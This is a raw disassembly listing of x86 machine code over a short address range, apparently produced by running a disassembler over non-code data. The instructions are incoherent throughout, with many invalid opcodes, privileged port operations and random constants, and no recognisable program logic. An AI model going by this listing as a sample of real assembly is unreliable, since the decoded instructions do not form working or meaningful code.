  42a861:	jo     0x42a8c4
  42a863:	pop    edi
  42a864:	dec    esi
  42a865:	xchg   edx,eax
  42a866:	dec    esp
  42a867:	push   ss
  42a868:	js     0x42a8d1
  42a86a:	ins    DWORD PTR es:[edi],dx
  42a86b:	mov    ecx,0xd2a1
	...
  42a8d4:	add    BYTE PTR [eax],al
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0xeefc6c97
  42a8e4:	pusha  
  42a8e5:	mov    al,0x67
  42a8e7:	enter  0x1,0x0
  42a8eb:	add    DWORD PTR [eax],eax
  42a8ed:	add    cl,cl
  42a8ef:	jp     0x42a8b3
  42a8f1:	mov    dh,0x8d
  42a8f3:	rcr    DWORD PTR [ecx+0x6a],1
  42a8f6:	jmp    0x42a8df
  42a8f8:	jo     0x42a957
  42a8fa:	cmp    DWORD PTR [ebp+0x37388fb6],edx
  42a900:	jbe    0x42a956
  42a902:	mov    DWORD PTR [ebx+edx*4],esp
  42a905:	pop    ebx
  42a906:	enter  0xfff4,0xbd
  42a90a:	iret   
  42a90b:	or     al,0xdd
  42a90d:	inc    esp
  42a90e:	xor    DWORD PTR [eax+0x3967d8d0],0x61cd2885
  42a918:	vhsubps ymm1,ymm6,YMMWORD PTR [edi]
  42a91c:	ror    BYTE PTR [ebx-0x75634e45],cl
  42a922:	mov    esi,0x3ae19426
  42a927:	out    0xe4,al
  42a929:	mov    eax,0xfc6add76
  42a92e:	std    
  42a92f:	sbb    DWORD PTR [ecx+ecx*1],esi
  42a932:	ins    DWORD PTR es:[edi],dx
  42a933:	loop   0x42a999
  42a935:	xor    edx,DWORD PTR [ebp-0x54]
  42a938:	mov    gs,esi
  42a93a:	xchg   esi,eax
  42a93b:	mov    dl,0x5d
  42a93d:	nop
  42a93e:	inc    edx
  42a93f:	push   ss
  42a940:	jmp    0x42a9a7
  42a942:	aas    
  42a943:	jne    0x42a9a4
  42a945:	adc    eax,0x6f2c169d
  42a94a:	scas   al,BYTE PTR es:[edi]
  42a94b:	sbb    al,0x6a
  42a94d:	and    DWORD PTR [ecx+0x44],eax
  42a950:	mov    ebp,ecx
  42a952:	mov    eax,ds:0x8fe2b15e
  42a957:	pop    esi
  42a958:	mov    ebx,0x6b4a5fa
  42a95d:	inc    eax
  42a95e:	dec    ecx
  42a95f:	out    dx,eax
  42a960:	ja     0x42a8e4
  42a962:	in     eax,dx
  42a963:	jmp    0x3d793c9f
  42a968:	add    eax,0x7e1190e0
  42a96d:	mov    ?,WORD PTR [esi]
  42a96f:	and    BYTE PTR [ebx-0x5ae49da1],ah
  42a975:	out    0xa0,al
  42a977:	and    al,0x80
  42a979:	mov    dh,0x52
  42a97b:	ret    
  42a97c:	mov    BYTE PTR [ecx-0x629a2bbe],bh
  42a982:	lods   al,BYTE PTR ds:[esi]
  42a983:	cmc    
  42a984:	scas   eax,DWORD PTR es:[edi]
  42a985:	jmp    0x42a97b
  42a987:	ins    BYTE PTR es:[edi],dx
  42a988:	pushf  
  42a989:	xor    BYTE PTR [ebx],0x83
  42a98c:	push   ebx
  42a98d:	push   ebx
  42a98e:	jo     0x42a98c
  42a990:	lods   eax,DWORD PTR ds:[esi]
  42a991:	push   edx
  42a992:	pusha  
  42a993:	(bad)  
  42a994:	retf   
  42a995:	mov    ecx,0xa0d6ff2
  42a99a:	xor    eax,0x9875d25e
  42a99f:	in     al,0xdd
  42a9a1:	adc    BYTE PTR [ecx-0x3d273a03],0x7
  42a9a8:	push   edi
  42a9a9:	adc    BYTE PTR [edi+0x73a2cfe1],bh
  42a9af:	xor    BYTE PTR [ebp+0x61c2f263],cl
  42a9b5:	(bad)  
  42a9b6:	in     al,0x4d
  42a9b8:	adc    al,0x15
  42a9ba:	iret   
  42a9bb:	fst    DWORD PTR [ebx-0x78942a77]
  42a9c1:	mov    DWORD PTR [esi-0x1c8d1dc9],edi
  42a9c7:	adc    ch,BYTE PTR [ecx-0x3e]
  42a9ca:	inc    edi
  42a9cb:	call   0x7856f1c
  42a9d0:	push   edx
  42a9d1:	mov    cl,BYTE PTR [edx+0x37e99a90]
  42a9d7:	push   edx
  42a9d8:	cmp    DWORD PTR [edx+eax*1+0x74d0f5e7],0x77
  42a9e0:	inc    ecx
  42a9e1:	jnp    0x42a9ac
  42a9e3:	pop    edi
  42a9e4:	lods   al,BYTE PTR ds:[esi]
  42a9e5:	int3   
  42a9e6:	add    DWORD PTR [edx],0x0
  42a9e9:	or     BYTE PTR [esi+0x3b1672],bl
	...
  42aa53:	add    BYTE PTR [eax],al
  42aa55:	add    BYTE PTR [eax+0x3fee1d93],ch
  42aa5b:	out    dx,al
  42aa5c:	sti    
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	es mov ebp,0xc96784dc
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	mov    al,0x39
  42aa70:	pop    ss
  42aa71:	xchg   esp,ecx
  42aa73:	mov    esi,0x3feaed6b
  42aa78:	out    0x69,eax
  42aa7a:	jae    0x42aa61
  42aa7c:	and    al,bl
  42aa7e:	jns    0x42aaf4
  42aa80:	cwde   
  42aa81:	push   edx
  42aa82:	outs   dx,BYTE PTR ds:[esi]
  42aa83:	xchg   ecx,eax
  42aa84:	xchg   edx,eax
  42aa85:	(bad)  
  42aa86:	bswap  esi
  42aa88:	dec    ebx
  42aa89:	xchg   ebx,eax
  42aa8a:	and    ebp,DWORD PTR [eax-0x342ba2f6]
  42aa90:	and    al,0xdd
  42aa92:	loope  0x42aa50
  42aa94:	out    0x96,eax
  42aa96:	sub    ch,ch
  42aa98:	push   cs
  42aa99:	pop    ds
  42aa9a:	adc    BYTE PTR [edi+0x7d1f4c75],ah
  42aaa0:	in     eax,dx
  42aaa1:	or     cl,BYTE PTR [eax-0x26ee69f9]
  42aaa7:	out    dx,eax
  42aaa8:	jae    0x42aa35
  42aaaa:	or     DWORD PTR [esi],0x61fa162e
  42aab0:	sahf   
  42aab1:	mov    edi,0xa852e756
  42aab6:	fwait
  42aab7:	sub    cl,BYTE PTR [ebx]
  42aab9:	aas    
  42aaba:	jns    0x42aabc
  42aabc:	mov    DWORD PTR [edi-0x35],0x389a1745
  42aac3:	jb     0x42aa45
  42aac5:	enter  0xcd82,0x95
  42aac9:	mov    DWORD PTR [eax-0x20098739],edx
  42aacf:	add    eax,0xb3d1924b
  42aad4:	stos   DWORD PTR es:[edi],eax
  42aad5:	mov    al,ds:0xc7123d7c
  42aada:	ins    BYTE PTR es:[edi],dx
  42aadb:	inc    ebx
  42aadc:	cmp    BYTE PTR [edi],cl
  42aade:	xor    BYTE PTR [ebx+0x62],ch
  42aae1:	mov    ah,0xfd
  42aae3:	jne    0x42ab0d
  42aae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aae6:	scas   eax,DWORD PTR es:[edi]
  42aae7:	mov    eax,0xf6e34442
  42aaec:	or     esi,ecx
  42aaee:	jmp    0x42aa8b
  42aaf0:	jmp    0x42aaf2
  42aaf2:	out    0x41,eax
  42aaf4:	out    dx,eax
  42aaf5:	stc    
  42aaf6:	into   
  42aaf7:	add    dh,dl
  42aaf9:	mov    dh,0x77
  42aafb:	pop    esp
  42aafc:	add    dh,ah
  42aafe:	jmp    0x42aa9e
  42ab00:	pop    edx
  42ab01:	pop    eax
  42ab02:	pusha  
  42ab03:	lods   eax,DWORD PTR ds:[esi]
  42ab04:	push   cs
  42ab05:	into   
  42ab06:	sub    dh,BYTE PTR [ecx]
  42ab08:	sbb    bl,bh
  42ab0a:	sbb    edx,ebx
  42ab0c:	rcr    BYTE PTR [ebx+edx*4-0x4213909a],0x27
  42ab14:	fwait
  42ab15:	nop
  42ab16:	imul   ebp,DWORD PTR [ecx-0x50],0x47
  42ab1a:	rcr    ebx,0x76
  42ab1d:	out    0xd6,eax
  42ab1f:	xor    eax,0x295414f3
  42ab24:	sbb    BYTE PTR [eax],ch
  42ab26:	in     eax,dx
  42ab27:	jmp    0x42ab0f
  42ab29:	bswap  edi
  42ab2b:	push   cs
  42ab2c:	mov    BYTE PTR [edx+0x6045865f],bh
  42ab32:	push   ebp
  42ab33:	push   edx
  42ab34:	mov    edx,0x4baf2f99
  42ab39:	mov    edx,DWORD PTR [edx+0x39]
  42ab3c:	ins    DWORD PTR es:[edi],dx
  42ab3d:	sbb    DWORD PTR [ecx-0x2da6b96f],edx
  42ab43:	push   es
  42ab44:	xchg   BYTE PTR [eax],al
  42ab46:	int    0x0
  42ab48:	(bad)  
  42ab49:	out    0x49,eax
  42ab4b:	jmp    0x750:0x341fe1b5
  42ab52:	adc    al,0xe1
  42ab54:	and    edx,ebx
  42ab56:	mov    cl,0x3c
  42ab58:	jecxz  0x42ab6c
  42ab5a:	or     esi,ebx
  42ab5c:	add    BYTE PTR [ecx],al
  42ab5e:	dec    ecx
  42ab5f:	cmp    DWORD PTR [eax-0x2feb40e0],esp
  42ab65:	rcl    BYTE PTR gs:[eax+0x61249cf2],1
  42ab6c:	or     DWORD PTR [ebp+0x0],edi
	...
  42abd3:	add    BYTE PTR [eax],al
  42abd5:	add    BYTE PTR [esi],bh
  42abd7:	push   cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	jne    0x42ab94
  42abe4:	cld    
  42abe5:	mov    esi,0x1ca67
  42abea:	add    BYTE PTR [ecx],al
  42abec:	add    BYTE PTR [eax],al
  42abee:	xchg   ecx,eax
  42abef:	dec    esp
  42abf0:	outs   dx,DWORD PTR ds:[esi]
  42abf1:	dec    ecx
  42abf2:	or     eax,edi
  42abf4:	je     0x42abe0
  42abf6:	dec    esp
  42abf7:	xchg   esi,eax
  42abf8:	jle    0x42ac26
  42abfa:	pop    esi
  42abfb:	cmc    
  42abfc:	pop    es
  42abfd:	or     esp,DWORD PTR fs:[edx+0xf]
  42ac01:	lea    eax,[eax-0xe]
  42ac04:	mov    eax,0x374be7f1
  42ac09:	jns    0x42ac19
  42ac0b:	mov    ecx,0x56948efd
  42ac10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac11:	in     eax,0x96
  42ac13:	stc    
  42ac14:	retf   0x6b87
  42ac17:	int3   
  42ac18:	adc    al,0xa5
  42ac1a:	addr16 int 0xbc
  42ac1d:	mov    al,ds:0x8e0fd1e2
  42ac22:	(bad)  
  42ac23:	shr    DWORD PTR [edi+0x4214fd6a],1
  42ac29:	jns    0x42abbe
  42ac2b:	fstp   TBYTE PTR [esi-0x1b]
  42ac2e:	fsub   DWORD PTR [esi-0x7c66ba89]
  42ac34:	imul   ecx,DWORD PTR [eax+0x3d],0x19
  42ac38:	cld    
  42ac39:	loope  0x42ac7f
  42ac3b:	or     ah,BYTE PTR [ecx]
  42ac3d:	fst    QWORD PTR [eax-0x77b0a3e2]
  42ac43:	dec    ecx
  42ac44:	shl    BYTE PTR [esi-0x17],1
  42ac47:	loope  0x42ac86
  42ac49:	or     ebx,DWORD PTR [esi+0x35]
  42ac4c:	popa   
  42ac4d:	test   BYTE PTR [ebp+0x21],dh
  42ac50:	dec    esi
  42ac51:	push   ss
  42ac52:	outs   dx,DWORD PTR ds:[esi]
  42ac53:	outs   dx,BYTE PTR ds:[esi]
  42ac54:	test   DWORD PTR [esi-0x5e8f9d3f],0xcb9eb266
  42ac5e:	lods   eax,DWORD PTR ds:[esi]
  42ac5f:	cmp    al,0x64
  42ac61:	das    
  42ac62:	push   ds
  42ac63:	aam    0x38
  42ac65:	xchg   ebx,esp
  42ac67:	jp     0x42ac5b
  42ac69:	ret    
  42ac6a:	mov    ebp,0x3f56d9eb
  42ac6f:	pop    eax
  42ac70:	stos   BYTE PTR es:[edi],al
  42ac71:	push   edi
  42ac72:	pop    eax
  42ac73:	sub    esi,DWORD PTR [edx+0x4134b2d9]
  42ac79:	iret   
  42ac7a:	mov    al,ds:0x6d726370
  42ac7f:	sbb    BYTE PTR [esi-0x70],cl
  42ac82:	add    BYTE PTR [edx+ebx*8],bh
  42ac85:	inc    esi
  42ac86:	sub    esp,DWORD PTR [edi]
  42ac88:	sbb    eax,edi
  42ac8a:	jbe    0x42acb1
  42ac8c:	pop    esp
  42ac8d:	ins    BYTE PTR es:[edi],dx
  42ac8e:	ins    BYTE PTR es:[edi],dx
  42ac8f:	lock mov ds:0x49d4ea0d,al
  42ac95:	xchg   esi,eax
  42ac96:	jl     0x42acd9
  42ac98:	push   0xffffffbd
  42ac9a:	int3   
  42ac9b:	popa   
  42ac9c:	xor    ah,BYTE PTR [bp+si]
  42ac9f:	ss sbb esi,ecx
  42aca2:	mov    ecx,0xce4c4ad8
  42aca7:	neg    BYTE PTR [ebx+eiz*2]
  42acaa:	cmp    DWORD PTR [edx+0x7b],eax
  42acad:	ja     0x42ac83
  42acaf:	fwait
  42acb0:	push   DWORD PTR [ecx-0x7e]
  42acb3:	test   ah,al
  42acb5:	js     0x42ac42
  42acb7:	cs inc ecx
  42acb9:	repnz mov eax,0x142fb5aa
  42acbf:	xlat   BYTE PTR ds:[ebx]
  42acc0:	jg     0x42acca
  42acc2:	ds pop esp
  42acc4:	cld    
  42acc5:	adc    eax,0x632c9b0f
  42acca:	dec    esi
  42accb:	ins    BYTE PTR es:[edi],dx
  42accc:	sub    eax,0xb8138123
  42acd1:	mov    ch,0xa0
  42acd3:	(bad)  
  42acd5:	dec    edi
  42acd6:	outs   dx,DWORD PTR ds:[esi]
  42acd7:	mov    ds:0xeb4c555d,al
  42acdc:	loopne 0x42ad39
  42acde:	jge    0x42acea
  42ace0:	lds    eax,FWORD PTR [eax-0x6f]
  42ace3:	mov    ecx,0xfa99fab0
  42ace8:	inc    esp
  42ace9:	mov    dh,0x74
  42aceb:	iret   
  42acec:	js     0x42ad16
	...
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	xor    esi,DWORD PTR [edi]
  42ad64:	mov    dh,0x92
  42ad66:	addr16 retf 
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	std    
  42ad6f:	mov    ds:0x99bebbf2,al
  42ad74:	add    DWORD PTR [eax+ebp*8+0x74fccccb],eax
  42ad7b:	scas   al,BYTE PTR es:[edi]
  42ad7c:	adc    DWORD PTR [ebx+0x48010276],esi
  42ad82:	xor    DWORD PTR [ecx],edx
  42ad84:	xchg   ebp,eax
  42ad85:	xor    BYTE PTR [ebx+edi*8+0x79c4d28],dl
  42ad8c:	pop    ds
  42ad8d:	ror    esi,1
  42ad8f:	test   eax,0x31866bb
  42ad94:	aam    0xbe
  42ad96:	sbb    eax,0x75e1c1a0
  42ad9b:	inc    eax
  42ad9c:	(bad)  
  42ad9d:	sbb    al,0xc
  42ad9f:	retf   0x126d
  42ada2:	outs   dx,BYTE PTR ds:[esi]
  42ada3:	mov    eax,0xfdd31884
  42ada8:	test   edx,ebp
  42adaa:	arpl   WORD PTR [eax],bx
  42adac:	imul   esp,DWORD PTR [edx],0xffffffca
  42adaf:	retf   
  42adb0:	std    
  42adb1:	jnp    0x42ad4e
  42adb3:	(bad)  
  42adb4:	jne    0x42ad6d
  42adb6:	or     al,0x9c
  42adb8:	loop   0x42ad94
  42adba:	jge    0x42ad88
  42adbc:	jne    0x42ae3c
  42adbe:	sbb    edx,esp
  42adc0:	test   al,0x21
  42adc2:	jmp    0x3c58:0xd1fbc4b6
  42adc9:	scas   eax,DWORD PTR es:[edi]
  42adca:	bound  esp,QWORD PTR [edi+0x74cb0de3]
  42add0:	cmp    al,0xad
  42add2:	and    al,0x2b
  42add4:	push   es
  42add5:	jno    0x42ade9
  42add7:	push   ss
  42add8:	cmp    bh,BYTE PTR ds:[ecx-0x484b3525]
  42addf:	pop    edx
  42ade0:	or     eax,0x328cda12
  42ade5:	mov    eax,0x633ef79e
  42adea:	not    DWORD PTR [eax+0x7bc515f1]
  42adf0:	(bad)  
  42adf1:	xchg   ebx,eax
  42adf2:	aaa    
  42adf3:	cli    
  42adf4:	(bad)  
  42adf6:	arpl   WORD PTR [ecx],bp
  42adf8:	xchg   ebx,eax
  42adf9:	shl    BYTE PTR [ebp-0x4494d94c],1
  42adff:	inc    ecx
  42ae00:	or     edi,ebx
  42ae02:	hlt    
  42ae03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae04:	sub    dh,BYTE PTR [esp+ecx*4+0x585e8b31]
  42ae0b:	(bad)  
  42ae0d:	mov    eax,ds:0x5202fd0
  42ae12:	rcr    esi,1
  42ae14:	jo     0x42ae2e
  42ae16:	jnp    0x42ae67
  42ae18:	mov    bl,0x14
  42ae1a:	sahf   
  42ae1b:	cs cdq 
  42ae1d:	pop    es
  42ae1e:	aas    
  42ae1f:	and    al,0xcc
  42ae21:	xor    BYTE PTR [eax-0x5d],bh
  42ae24:	rol    bh,cl
  42ae26:	add    DWORD PTR [ebp+0x7c],esp
  42ae29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae2a:	aam    0xd9
  42ae2c:	fist   DWORD PTR [ecx+0x6899055b]
  42ae32:	(bad)  
  42ae33:	xchg   edx,eax
  42ae34:	jne    0x42ae23
  42ae36:	int    0xaf
  42ae38:	push   ds
  42ae39:	pushf  
  42ae3a:	adc    DWORD PTR [ebp-0x4],ecx
  42ae3d:	pop    ss
  42ae3e:	xor    bl,BYTE PTR ds:0xb48a2fce
  42ae44:	and    BYTE PTR [ecx],dl
  42ae46:	mov    esi,0xc1348d90
  42ae4b:	xor    al,0x92
  42ae4d:	fwait
  42ae4e:	mul    eax
  42ae50:	mov    ch,0x57
  42ae52:	dec    eax
  42ae53:	retf   0x3f31
  42ae56:	dec    edx
  42ae57:	xchg   esi,eax
  42ae58:	ins    DWORD PTR es:[edi],dx
  42ae59:	and    dh,BYTE PTR [esi+0x1928097f]
  42ae5f:	stos   DWORD PTR es:[edi],eax
  42ae60:	pop    es
  42ae61:	cmp    cl,BYTE PTR [ebp+0x1e]
  42ae64:	lds    edi,FWORD PTR [esi]
  42ae66:	push   ss
  42ae67:	scas   al,BYTE PTR es:[edi]
  42ae68:	data16 shl BYTE PTR [esi-0x79],0xdb
  42ae6d:	lock add BYTE PTR [eax],al
	...
  42aed4:	add    BYTE PTR [eax],al
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	inc    edx
  42aee3:	in     eax,0xcb
  42aee5:	or     DWORD PTR [edi-0x34],esp
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	in     eax,0x4c
  42aef0:	pop    ecx
  42aef1:	pop    ebp
  42aef2:	mov    eax,ds:0x50bb16bc
  42aef7:	into   
  42aef8:	out    0xbf,al
  42aefa:	repz cld 
  42aefc:	mov    bl,BYTE PTR [ebx-0x63]
  42aeff:	push   0xe214bcf6
  42af04:	cmp    edi,DWORD PTR [ecx+0x7ec1e940]
  42af0a:	es pop ebp
  42af0c:	push   esp
  42af0d:	ja     0x42af17
  42af0f:	call   0xab2a8a6e
  42af14:	popf   
  42af15:	ret    0x2918
  42af18:	stos   DWORD PTR es:[edi],eax
  42af19:	jle    0x42aee0
  42af1b:	addr16 pop ss
  42af1d:	out    0x19,al
  42af1f:	cld    
  42af20:	cwde   
  42af21:	mov    ch,0xf0
  42af23:	cmp    DWORD PTR [edx+edx*8],ecx
  42af26:	test   DWORD PTR [esi+0x4b],esi
  42af29:	add    eax,0x4ee3407e
  42af2e:	je     0x42af1b
  42af30:	mov    ah,0x91
  42af32:	dec    eax
  42af33:	pop    edi
  42af34:	icebp  
  42af35:	rol    DWORD PTR [ecx-0x34c349ee],1
  42af3b:	push   ss
  42af3c:	xchg   DWORD PTR [ebp+0x19],esi
  42af3f:	jg     0x42af1d
  42af41:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af43:	ss icebp 
  42af45:	sub    al,0xa2
  42af47:	cmp    DWORD PTR ds:0xe691ecab,eax
  42af4d:	inc    esp
  42af4e:	xchg   esp,esp
  42af50:	mov    ebx,0x24812d55
  42af55:	lahf   
  42af56:	xor    al,0xb
  42af58:	jae    0x42af19
  42af5a:	nop
  42af5b:	ins    DWORD PTR es:[edi],dx
  42af5c:	out    0xf8,al
  42af5e:	dec    edx
  42af5f:	adc    al,0xbb
  42af61:	add    DWORD PTR [eax+0x12],esp
  42af64:	shl    cl,cl
  42af66:	mov    cl,0xae
  42af68:	enter  0xf57,0x79
  42af6c:	xchg   DWORD PTR [eax-0x713e3752],ebx
  42af72:	in     eax,dx
  42af73:	ret    
  42af74:	je     0x42af14
  42af76:	enter  0x3015,0x51
  42af7a:	(bad)  
  42af7b:	adc    DWORD PTR [ebx+0x62],ebx
  42af7e:	pop    eax
  42af7f:	stos   BYTE PTR es:[edi],al
  42af80:	test   al,0xa0
  42af82:	mov    ah,0x2e
  42af84:	call   0x32d628de
  42af89:	call   0xcb833a6f
  42af8e:	adc    eax,DWORD PTR [ecx-0x289f1956]
  42af94:	inc    ecx
  42af95:	in     al,dx
  42af96:	add    dh,BYTE PTR [ecx-0x282927cc]
  42af9c:	push   edx
  42af9d:	push   ebp
  42af9e:	push   edi
  42af9f:	nop
  42afa0:	aad    0x48
  42afa2:	stc    
  42afa3:	xchg   edi,eax
  42afa4:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42afa6:	scas   al,BYTE PTR es:[edi]
  42afa7:	cs adc al,0x72
  42afaa:	inc    esp
  42afab:	into   
  42afac:	stos   DWORD PTR es:[edi],eax
  42afad:	dec    ecx
  42afae:	xchg   edx,eax
  42afaf:	mov    ebp,0x6bd72f89
  42afb4:	mov    al,0xec
  42afb6:	xor    esi,DWORD PTR [ebp-0x54]
  42afb9:	mov    edx,esi
  42afbb:	jnp    0x42afca
  42afbd:	lock push ecx
  42afbf:	push   0xd6a8b8aa
  42afc4:	setle  BYTE PTR [esi]
  42afc7:	dec    esp
  42afc8:	and    dh,BYTE PTR [edx+0x5774195b]
  42afce:	popa   
  42afcf:	arpl   bp,ax
  42afd1:	push   ds
  42afd2:	push   edx
  42afd3:	cmp    BYTE PTR [ecx],0x8c
  42afd6:	mov    esp,0x6297e51f
  42afdb:	pop    esi
  42afdc:	bound  ecx,QWORD PTR [ecx]
  42afde:	and    bl,bl
  42afe0:	cmp    al,dl
  42afe2:	(bad)  
  42afe3:	xor    al,0x77
  42afe5:	jb     0x42afc2
  42afe7:	ins    BYTE PTR es:[edi],dx
  42afe8:	mov    ds:0x150a8585,eax
  42afed:	aam    0x0
	...
  42b053:	add    BYTE PTR [eax],al
  42b055:	add    cl,bh
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	je     0x42b0b2
  42b064:	(bad)  
  42b065:	(bad)  
  42b066:	addr16 int 0x1
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    BYTE PTR [eax],al
  42b06f:	(bad)  
  42b070:	mov    cl,0x26
  42b072:	push   gs
  42b074:	xchg   esp,eax
  42b075:	pop    ecx
  42b076:	inc    edx
  42b077:	add    dl,BYTE PTR [edx+0x33]
  42b07a:	and    ebx,eax
  42b07c:	push   cs
  42b07d:	push   eax
  42b07e:	test   BYTE PTR [ebp-0x33a2fb57],ah
  42b084:	out    dx,eax
  42b085:	mov    DWORD PTR [ebp+0x47],esi
  42b088:	and    eax,0x9a600957
  42b08d:	mov    ch,0x37
  42b08f:	and    esp,edx
  42b091:	or     eax,0xfa7f6278
  42b096:	mov    edx,0xbf04d58a
  42b09b:	push   ds
  42b09c:	outs   dx,BYTE PTR ds:[esi]
  42b09d:	xchg   BYTE PTR [ebx-0x3cd6cd4c],al
  42b0a3:	push   ecx
  42b0a4:	cmp    al,0x23
  42b0a6:	fld    TBYTE PTR [edi]
  42b0a8:	push   esi
  42b0a9:	xchg   ecx,eax
  42b0aa:	mov    ?,edx
  42b0ac:	popf   
  42b0ad:	adc    BYTE PTR [esi],ch
  42b0af:	mov    esp,0x2780ce33
  42b0b4:	adc    BYTE PTR [ebp-0x7a],0xb6
  42b0b8:	dec    esp
  42b0b9:	mov    ?,WORD PTR [edi-0x1247d2d2]
  42b0bf:	fwait
  42b0c0:	popa   
  42b0c1:	lds    edi,FWORD PTR [edi-0x1ee8d751]
  42b0c7:	mov    al,ds:0xc463d4b
  42b0cc:	mov    ebp,0x304dc939
  42b0d1:	push   ds
  42b0d2:	pop    es
  42b0d3:	iret   
  42b0d4:	scas   eax,DWORD PTR es:[edi]
  42b0d5:	or     DWORD PTR [eax+edx*4+0xba44ce9],esp
  42b0dc:	mov    BYTE PTR [esi-0x55f4b027],bl
  42b0e2:	imul   esi,DWORD PTR [esi-0x65b9d4b2],0xffffffae
  42b0e9:	mov    ah,0x16
  42b0eb:	ins    BYTE PTR es:[edi],dx
  42b0ec:	adc    eax,0xfc94d642
  42b0f1:	cmp    edx,ebx
  42b0f3:	add    dl,0x41
  42b0f6:	mov    ebp,0x9021fc74
  42b0fb:	push   0x4b
  42b0fd:	out    0x32,al
  42b0ff:	mov    cx,0x75a6
  42b103:	add    eax,0xa9d6490f
  42b108:	fst    QWORD PTR [esi]
  42b10a:	stc    
  42b10b:	jge    0x42b144
  42b10d:	sbb    DWORD PTR [edx],0xffffffde
  42b110:	jnp    0x42b149
  42b112:	cmp    ah,dh
  42b114:	mov    ds:0x1869d6b5,al
  42b119:	cld    
  42b11a:	cmp    BYTE PTR [eax+0x2d],dh
  42b11d:	and    al,BYTE PTR [ebx+0x667bdb0a]
  42b123:	out    0x30,eax
  42b125:	sbb    DWORD PTR [esi+0x77888a50],0x38930cb4
  42b12f:	stos   DWORD PTR es:[edi],eax
  42b130:	in     al,0xfc
  42b132:	pop    ss
  42b133:	out    dx,al
  42b134:	dec    ebp
  42b135:	push   0xa6c8ad10
  42b13a:	dec    bx
  42b13c:	cmp    DWORD PTR [edx],esp
  42b13e:	pop    ebx
  42b13f:	pop    edi
  42b140:	lds    ebp,FWORD PTR [esi]
  42b142:	cld    
  42b143:	mov    edx,0xb6b5fbea
  42b148:	aad    0x6e
  42b14a:	cmp    al,0x2e
  42b14c:	or     eax,0x21937e02
  42b151:	mov    esi,0xdac40ec1
  42b156:	cmp    al,0xf
  42b158:	popa   
  42b159:	push   ebp
  42b15a:	out    dx,eax
  42b15b:	fcom   st(3)
  42b15d:	jno    0x42b144
  42b15f:	mov    ebp,0xc268e4b4
  42b164:	pusha  
  42b165:	repnz adc eax,0xab1cecef
  42b16b:	sub    al,0xd3
  42b16d:	arpl   WORD PTR [eax],ax
	...
  42b1d3:	add    BYTE PTR [eax],al
  42b1d5:	add    BYTE PTR [ebp+0x25],dh
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	and    al,0x63
  42b1e4:	cmp    al,0x34
  42b1e6:	addr16 into 
  42b1e8:	add    DWORD PTR [eax],eax
  42b1ea:	add    BYTE PTR [ecx],al
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	pop    ebp
  42b1ef:	jno    0x42b191
  42b1f1:	push   ss
  42b1f2:	call   0x7b63e7e7
  42b1f7:	(bad)  
  42b1f8:	jae    0x42b1e8
  42b1fa:	xchg   ecx,eax
  42b1fb:	mov    edi,0x512d951f
  42b200:	jle    0x42b211
  42b202:	je     0x42b1ff
  42b204:	in     al,dx
  42b205:	dec    eax
  42b206:	mov    ah,0x32
  42b208:	mov    al,0x67
  42b20a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b20b:	addr16 inc edi
  42b20d:	gs stos DWORD PTR es:[edi],eax
  42b20f:	cld    
  42b210:	cmc    
  42b211:	call   FWORD PTR [eax-0x73]
  42b214:	adc    ecx,DWORD PTR [edx+0x33d10932]
  42b21a:	scas   al,BYTE PTR es:[edi]
  42b21b:	mov    esp,0xb4c806eb
  42b220:	icebp  
  42b221:	push   ss
  42b222:	mov    cl,0x73
  42b224:	aad    0x80
  42b226:	shr    DWORD PTR [edi],cl
  42b228:	stc    
  42b229:	ss mov ebx,0x680277db
  42b22f:	cmp    BYTE PTR [edx+0x38cffe66],bl
  42b235:	lock push ebx
  42b237:	pop    ss
  42b238:	mov    eax,ds:0xc610361f
  42b23d:	or     ebp,esi
  42b23f:	xchg   ebx,eax
  42b240:	in     eax,0x88
  42b242:	mov    edi,0xaff6faaf
  42b247:	and    BYTE PTR [edi],al
  42b249:	xchg   ecx,eax
  42b24a:	jnp    0x42b27a
  42b24c:	inc    esp
  42b24d:	jne    0x42b2a2
  42b24f:	ret    
  42b250:	enter  0x7f6,0x12
  42b254:	adc    DWORD PTR [ebp-0xa],0xff3b5bb8
  42b25b:	aad    0x6a
  42b25d:	(bad)  [ecx+0x345df56a]
  42b263:	aam    0x5c
  42b265:	std    
  42b266:	cmp    esp,DWORD PTR [ebx+0x24]
  42b269:	retf   0x9e3c
  42b26c:	mov    edi,DWORD PTR [ecx+0xf039f28]
  42b272:	clc    
  42b273:	dec    ebx
